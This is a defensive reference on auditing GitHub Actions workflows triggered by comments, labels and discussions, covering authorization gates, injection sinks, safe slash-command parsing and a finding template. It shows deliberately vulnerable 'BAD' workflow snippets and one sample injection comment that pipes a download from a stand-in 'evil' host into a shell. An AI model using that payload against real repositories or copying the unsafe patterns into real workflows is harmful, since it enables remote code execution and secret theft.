<!--
  Generated initially from spec.yaml; durable after that. Edit this
  reference directly to improve domain depth. Skillet regenerates
  only missing reference files.
-->

# Chatops, comment, label, and discussion triggers

## When to use

Load when the workflow under review triggers on any of:

- `issue_comment` (fires on PR comments too — PRs are issues)
- `pull_request_review`, `pull_request_review_comment`
- `discussion`, `discussion_comment`
- `issues` with `labeled`/`assigned`/`unassigned` types
- `pull_request_target` with `labeled` activity types
- Label-, assignee-, or reaction-driven dispatch jobs

These triggers run in the **target repo's trusted context** (full secrets, write `GITHUB_TOKEN`) but are reachable by anyone who can comment, open an issue, or (in some configurations) react. Treat every such workflow as remotely-reachable until an authorization gate is proven.

## Contents

1. Threat model and trust boundary
2. Authorization gate patterns (safe vs unsafe)
3. `author_association` values and pitfalls
4. Comment-body / label-name interpolation sinks
5. Slash-command parsing safely
6. Label and assignee triggers
7. Discussion triggers
8. False-positive traps
9. Finding template

## 1. Threat model and trust boundary

| Trigger | Who can fire it | Default privilege |
|---|---|---|
| `issue_comment` (created/edited) | Anyone with a GitHub account on a public repo | Full secrets, write token |
| `pull_request_review[_comment]` | Anyone reviewing a PR | Full secrets, write token |
| `discussion`, `discussion_comment` | Anyone with a GitHub account | Full secrets, write token |
| `issues` (labeled/assigned) | Triagers/maintainers — but the **payload** (issue title/body) is attacker-supplied | Full secrets, write token |
| `pull_request_target` (labeled) | Maintainer who applies the label — but PR head ref is attacker-controlled | Full secrets, write token |

The misconception to break: "only maintainers can label / merge / approve, so this is safe." The trigger may be maintainer-gated, but the **data inside the event** (issue body, PR title, comment text, branch name) almost always comes from an untrusted user.

## 2. Authorization gate patterns

### Required gates for any privileged action

A chatops job that runs code, deploys, publishes, mutates the repo, or checks out PR head **must** gate on author identity before doing privileged work. Acceptable gates:

```yaml
# Gate 1: author_association on the comment/review/issue itself
if: |
  github.event.comment.author_association == 'OWNER' ||
  github.event.comment.author_association == 'MEMBER' ||
  github.event.comment.author_association == 'COLLABORATOR'
```

```yaml
# Gate 2: explicit org/team membership check via API (more robust)
- uses: actions/github-script@<sha>
  id: check
  with:
    script: |
      const { data: membership } = await github.rest.orgs
        .checkMembershipForUser({ org: 'my-org', username: context.actor })
        .catch(() => ({ data: null }));
      core.setOutput('member', membership ? 'true' : 'false');

- if: steps.check.outputs.member != 'true'
  run: |
    echo "::error::not authorized"
    exit 1
```

```yaml
# Gate 3: allowlist of usernames (small teams)
if: contains(fromJSON('["alice","bob"]'), github.event.comment.user.login)
```

### Unsafe gates (flag these)

```yaml
# BAD: no gate at all
on: issue_comment
jobs:
  deploy:
    if: startsWith(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps: [ ... privileged ... ]
```

```yaml
# BAD: gate on issue/PR author, not commenter
if: github.event.issue.user.login == 'maintainer'
# Anyone can comment on the maintainer's issue.
```

```yaml
# BAD: weak association
if: github.event.comment.author_association != 'NONE'
# FIRST_TIME_CONTRIBUTOR, CONTRIBUTOR pass this — they are still untrusted.
```

```yaml
# BAD: regex on comment body deciding privilege
if: contains(github.event.comment.body, 'I am a maintainer')
```

```yaml
# BAD: gate after the privileged step
- run: ./deploy.sh   # already ran
- if: github.event.comment.author_association != 'OWNER'
  run: exit 1
```

## 3. `author_association` values

| Value | Trust |
|---|---|
| `OWNER` | Repo owner — trusted |
| `MEMBER` | Org member — trusted |
| `COLLABORATOR` | Has push access — trusted |
| `CONTRIBUTOR` | Has had a PR merged — **not trusted** for chatops |
| `FIRST_TIME_CONTRIBUTOR` | One merged PR — **not trusted** |
| `FIRST_TIMER` | First-time GitHub user on this repo — **not trusted** |
| `MANNEQUIN` | Imported placeholder account — **not trusted** |
| `NONE` | No association — **not trusted** |

Pitfalls:

- Comparing with `!=` rather than enumerating an allowlist with `==` lets new GitHub-added values slip through. Prefer `in (OWNER, MEMBER, COLLABORATOR)`.
- `author_association` lives on different fields per event: `github.event.comment.author_association`, `github.event.review.author_association`, `github.event.issue.author_association`. Confirm the correct path for the event type — a typo silently evaluates to empty and a `!= 'NONE'` check passes.
- Org membership via `author_association == 'MEMBER'` only reflects **public** membership for some endpoints; private-membership users may show as `NONE`. The API check (Gate 2) is more reliable.

## 4. Comment-body / label-name interpolation sinks

The other half of the chatops bug class: even with a correct authorization gate, **interpolating attacker-supplied event data into shell or script bodies is RCE**.

Attacker-controlled fields on these events:

- `github.event.comment.body`
- `github.event.review.body`
- `github.event.issue.title`, `github.event.issue.body`
- `github.event.pull_request.title`, `github.event.pull_request.body`
- `github.event.pull_request.head.ref`, `head.label`, `head.repo.*`
- `github.event.label.name`, `github.event.label.description`
- `github.event.discussion.title`, `discussion.body`
- `github.event.comment.user.login` (limited charset, but still untrusted)

### BAD — direct interpolation

```yaml
- run: echo "Comment was: ${{ github.event.comment.body }}"
# Comment body: "); curl evil | sh; #
```

```yaml
- uses: actions/github-script@<sha>
  with:
    script: |
      const body = "${{ github.event.comment.body }}";  // RCE on `");...//`
      ...
```

```yaml
- run: |
    echo "Label applied: ${{ github.event.label.name }}"
# Label names allow many characters including backticks/$().
```

### SAFE — env var + quoted shell

```yaml
- env:
    BODY: ${{ github.event.comment.body }}
  run: |
    printf '%s\n' "$BODY"     # quoted, no eval
```

### SAFE — github-script via context

```yaml
- uses: actions/github-script@<sha>
  with:
    script: |
      const body = context.payload.comment.body;   // not interpolated
      // process body as data, never as code (no eval, new Function, exec)
```

Even via `env:`, do **not** then pass `$BODY` to `eval`, `bash -c "$BODY"`, `sh -c`, `node -e`, `python -c`, `gh ... --body $BODY` (unquoted), or any sink that re-parses the value.

## 5. Slash-command parsing safely

A typical pattern: `/deploy staging`, `/release v1.2.3`, `/retry`. Parse safely:

```yaml
jobs:
  parse:
    if: |
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/deploy') &&
      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'),
               github.event.comment.author_association)
    runs-on: ubuntu-latest
    outputs:
      target: ${{ steps.p.outputs.target }}
    steps:
      - id: p
        env:
          BODY: ${{ github.event.comment.body }}
        run: |
          # validate against an allowlist; never echo raw body into outputs
          target="$(printf '%s' "$BODY" | awk '{print $2}')"
          case "$target" in
            staging|prod) ;;
            *) echo "::error::invalid target"; exit 1 ;;
          esac
          printf 'target=%s\n' "$target" >> "$GITHUB_OUTPUT"
```

Rules:

- Read body via `env:`, never `${{ }}` into shell.
- Validate arguments against an **allowlist** (`case` / `[[ "$x" =~ ^[a-z0-9.-]+$ ]]`), not a denylist.
- Reject anything multi-line: `printf '%s' "$BODY" | head -1`.
- Never write the raw body to `$GITHUB_OUTPUT` / `$GITHUB_ENV` (newline injection — see expression-injection reference).

## 6. Label and assignee triggers

```yaml
on:
  pull_request_target:
    types: [labeled]
```

Two distinct risks:

1. **Who can apply the label?** On most repos, only triagers/maintainers, so the trigger itself is gated. But forks of public repos sometimes allow first-time contributors to add labels via Actions or apps — verify.
2. **Does the labeled job check out PR head and run code?** If yes, applying the trigger label means executing the PR's code with full secrets — same as `pull_request_target` `pwn_request`. Maintainer label discipline is the only barrier; treat it as fragile.

Recommended pattern: gate on the specific label name **and** keep the job free of PR-head execution.

```yaml
jobs:
  preview:
    if: github.event.label.name == 'safe-to-preview'
    # do NOT checkout pull_request.head.sha and run its build scripts.
    # Use the base ref or pre-built artifacts only.
```

For `issues.labeled` / `issues.assigned`, the issue title/body remain attacker-controlled — apply §4.

## 7. Discussion triggers

`discussion` and `discussion_comment` behave like `issues`/`issue_comment` for trust purposes:

- Anyone can create a discussion or comment.
- Body, title, and category are attacker-controlled.
- `author_association` exists on the comment/discussion.

There is no "discussion is a PR" subcase, so `github.event.issue.pull_request` style guards do not apply. Authorization must be explicit.

## 8. False-positive traps

Do not flag these as bugs:

- An `issue_comment` workflow that only adds a reaction or posts a templated reply via `github-script` using `context.payload.*` (no interpolation, no shell). Posting back the comment author's login as a string in a reply is fine; running it as code is not.
- An `issue_comment` job whose only action is `gh pr comment` with the body passed via `--body-file` or stdin from an env var — quoting is intact.
- A `pull_request_target: [labeled]` job that runs only on the **base** ref (no `ref:` override on checkout) and does not execute PR-controlled scripts.
- An authorization gate that uses `==` against an explicit allowlist of `OWNER`/`MEMBER`/`COLLABORATOR` — this is the recommended pattern, not a bug.
- `if: github.event.sender.type == 'Bot'` combined with a known-bot allowlist — acceptable when the bot identity is verified.

Do flag:

- Any chatops workflow with no `if:` author gate **and** any privileged step (deploy, publish, push, comment with token, checkout PR head, run script).
- Gates using `!=` against `NONE`, or gates on the issue/PR author rather than the commenter/reviewer.
- Comment/label/title interpolated into `run:`, `script:`, `bash -c`, `eval`, or written unsanitised to `$GITHUB_ENV`/`$GITHUB_OUTPUT`.
- `pull_request_target: [labeled]` jobs that subsequently checkout `pull_request.head.sha` and execute its code.

## 9. Finding template

For each chatops finding include:

- **File:line** of the trigger and the sink.
- **Trigger**: event type and activity types.
- **Reach**: who can fire it (anyone with a GitHub account / org members / maintainers via labels).
- **Authorization gate**: present? on the right field? allowlist or denylist? before the privileged step?
- **Untrusted input**: which event field, and how it is consumed.
- **Sink**: shell interpolation, github-script body, `$GITHUB_ENV` write, PR-head checkout + execute, etc.
- **Privilege spent**: secrets exposed, token scopes, OIDC, self-hosted runner.
- **Fix**: explicit `author_association` allowlist or org-membership API check **and** `env:`-var pattern with quoted shell **and**, where relevant, allowlist validation of parsed arguments.

Example fix snippet to recommend:

```yaml
on: issue_comment
jobs:
  cmd:
    if: |
      github.event.issue.pull_request &&
      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'),
               github.event.comment.author_association)
    permissions:
      contents: read         # narrow to what the command needs
      pull-requests: write
    runs-on: ubuntu-latest
    steps:
      - env:
          BODY: ${{ github.event.comment.body }}
        run: |
          arg="$(printf '%s' "$BODY" | awk '{print $2}')"
          [[ "$arg" =~ ^[a-z0-9-]{1,32}$ ]] || { echo "bad arg"; exit 1; }
          ./scripts/run-command.sh "$arg"
```
